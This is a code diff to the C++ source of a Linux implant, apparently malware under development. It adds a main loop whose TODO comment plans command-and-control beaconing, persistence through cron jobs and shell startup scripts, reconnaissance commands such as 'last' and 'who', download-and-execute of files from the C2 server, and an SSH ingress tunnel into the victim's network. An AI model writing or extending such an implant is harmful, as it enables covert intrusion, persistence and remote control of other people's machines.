@@ -20,6 +20,7 @@ Core::Core() {
     try {
         contact_server();
         establish_persistence();                                     // after this call, file_system_locations will be populated with the locations the file has been copied to;
+        loop();
     } catch (const std::exception & e) {
         std::cout << "[!] Core::Core raised a standard exception" << e.what() << '\n';
     } catch (...) {
@@ -27,6 +28,29 @@ Core::Core() {
     }
 }
 
+void Core::loop() {
+    /* TODO
+     * at this point, the implant has established C2 communication (over TLS), and the persistence routines have run;
+     *
+     * 1. conditional: if established_persistence_count > 0: attempt to establish persistence via scheduled job and injecting startup scripts (bash, zsh, ash, etc.)
+     *      - echo $SHELL or "ps -p $$ -o comm="
+     *      - scheduled_job_persistence()
+     *      - startup_script_persistence()
+     * 2. establish a loop to reach back out to the C2 channel once every 24 hours at a random interval throughout the day:
+     *      - confirm contact
+     *      - decode and read instruction       -> instruction should be of the form: COMMAND : file_to_stage
+     *      - support instructions:
+     *              - light_reconnaissance      -> grab current userid, username, kernel and OS versions, network interfaces, and recent user activity
+     *                                          -> recent user activity: 
+         *                                              - most recent 10 logons: "last | head -n 10"
+         *                                              - processes of current logons: "w"
+         *                                              - current logons: who
+     *              - heavy_reconnaissance      -> grab running processes, user cronjobs, suid files, capabilities, world readable configs, list world readable home folders
+     *              - run_file : file.type      -> grab the indicated file off of the C2 GH, write it to a hidden file, render it executable, and start it as a process
+     *              - open_ingress_tunnel       -> open an ssh-tunnel based ingress channel into the local network
+     *      
+    */
+}
                                             // The TLS encryption of this request has been confirmed with Wireshark
                                             // consult for further changes: https://github.com/yhirose/cpp-httplib
 void Core::contact_server() {
